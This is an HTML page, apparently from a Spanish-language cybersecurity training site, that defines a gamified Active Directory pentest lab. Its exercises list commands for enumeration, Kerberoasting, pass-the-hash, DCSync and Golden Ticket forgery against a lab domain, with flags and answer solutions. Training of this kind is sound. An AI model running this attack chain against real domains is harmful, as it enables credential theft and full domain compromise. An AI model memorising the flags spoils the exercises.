@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🏛️ Lab ad-01: Active Directory — CyberDefense Labs</title>
+    <link rel="stylesheet" href="../../assets/css/lab-runner.css">
+</head>
+<body>
+    <div class="lab-page" id="lab-page"></div>
+    <script src="../../docs/assets/js/gamification.js"></script>
+    <script src="../../assets/js/lab-runner.js"></script>
+    <script>
+    const LAB_CONFIG = {
+        id: 'ad-01', name: 'Active Directory Pentest', subtitle: 'Enumera y explota un entorno AD completo',
+        icon: '🏛️', difficulty: 'avanzado', totalXP: 500, time: '90 min',
+        exercises: [
+            { title: 'Enumeration', xp: 80, objective: 'Enumera usuarios, grupos y hosts del dominio.', steps: ['Conéctate al DC', 'Enumera usuarios con ldapsearch', 'Mapea grupos y privilegios'], code: '$ crackmapexec smb 10.0.7.10 -u user -p pass --users\n$ ldapsearch -x -H 10.0.7.10 -D "user@corp.local" -w pass -b "DC=corp,DC=local"', codeLang: 'bash', flag: 'FLAG{ad_enumeration_complete}', hint: 'Usa crackmapexec para SMB y ldapsearch para LDAP. El DC está en 10.0.7.10.', solution: '50 usuarios, 15 grupos, 3 OU descubiertos en el dominio corp.local.' },
+            { title: 'Kerberoasting', xp: 90, objective: 'Obtén hashes Kerberos de service accounts.', steps: ['Identifica service accounts con SPN', 'Solicita TGS', 'Crackea el hash'], code: '$ impacket-GetUserSPNs corp.local/user:pass -request\n$ hashcat -m 13100 kerberoast.txt rockyou.txt', codeLang: 'bash', flag: 'FLAG{kerberoast_hash_cracked}', hint: 'GetUserSPNs lista accounts con SPN. El hash es type 23 (RC4).', solution: 'Service account "sqlservice" crackeada. Contraseña: SQLService2024!' },
+            { title: 'Pass-the-Hash', xp: 90, objective: 'Usa hashes para moverte entre hosts.', steps: ['Extrae el hash NTLM', 'Usa pass-the-Hash con evil-winrm', 'Accede a hosts remotos'], code: '$ evil-winrm -i 10.0.7.20 -u admin -H "aad3b435b51404eeaad3b435b51404ee:hash"', codeLang: 'bash', flag: 'FLAG{pth_access_gained}', hint: 'evil-winrm acepta hashes NTLM con -H. El host objetivo es 10.0.7.20.', solution: 'Acceso obtenido a FILE-SERVER vía Pass-the-Hash.' },
+            { title: 'DCSync', xp: 100, objective: 'Simula un DC para replicar credenciales.', steps: ['Obtén privilegios de replicación', 'Ejecuta DCSync', 'Obtén hash de krbtgt'], code: '$ impacket-secretsdump corp.local/admin:pass@10.0.7.10', codeLang: 'bash', flag: 'FLAG{dcsync_krbtgt_obtained}', hint: 'Secretsdump ejecuta DCSync si tienes privilegios de replicación. krbtgt permite Golden Ticket.', solution: 'Hash de krbtgt obtenido. Golden Ticket posible. Dominio comprometido.' },
+            { title: 'Golden Ticket', xp: 80, objective: 'Crea un Golden Ticket para acceso persistente.', steps: ['Usa el hash de krbtgt', 'Crea un TGT forgery', 'Accede a cualquier recurso'], code: '$ impacket-ticketer -nthash krbtgt_hash -domain-sid S-1-5-21-... -domain corp.local admin', codeLang: 'bash', flag: 'FLAG{golden_ticket_created}', hint: 'ticketer crea un TGT con el hash de krbtgt. Necesitas el Domain SID.', solution: 'Golden Ticket creado. Acceso persistente a todo el dominio.' },
+            { title: 'Reporte AD', xp: 60, objective: 'Documenta el pentest completo del Active Directory.', steps: ['Resume hallazgos', 'Documenta attack paths', 'Incluye remediaciones'], code: '## AD Pentest Report\n## Domain: corp.local\n## DC: 10.0.7.10\n## Attack Path: Kerberoasting → PTH → DCSync → Golden Ticket\n## Critical: krbtgt hash compromised', codeLang: 'markdown', flag: 'FLAG{ad_report_complete}', hint: 'El reporte debe incluir: dominio, DC, attack paths, hallazgos críticos, remediaciones.', solution: 'Reporte AD completo documentando toda la cadena de ataque.' }
+        ]
+    };
+    document.addEventListener('DOMContentLoaded', () => { CDPN_LabRunner.init(LAB_CONFIG); });
+    </script>
+</body>
+</html>
